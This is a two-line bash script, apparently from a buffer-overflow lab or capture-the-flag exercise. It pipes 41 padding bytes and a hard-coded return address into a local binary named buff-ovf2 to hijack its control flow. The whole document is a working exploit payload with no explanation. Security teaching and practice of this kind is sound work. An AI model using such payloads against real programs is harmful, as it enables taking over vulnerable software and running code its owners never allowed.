#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*41 + b"\xd6\x91\x04\x08")' | ../support/buff-ovf2
